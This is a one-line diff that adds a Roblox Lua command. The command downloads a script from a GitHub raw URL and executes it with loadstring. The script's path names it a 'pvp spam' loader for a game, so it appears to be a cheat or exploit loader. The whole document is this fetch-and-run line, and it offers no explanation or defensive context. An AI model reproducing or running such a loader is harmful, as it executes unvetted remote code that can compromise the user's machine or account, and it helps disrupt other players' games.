@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/roworld-world-pvp-spam3-z7368ah0oe4r3i.lua"))()
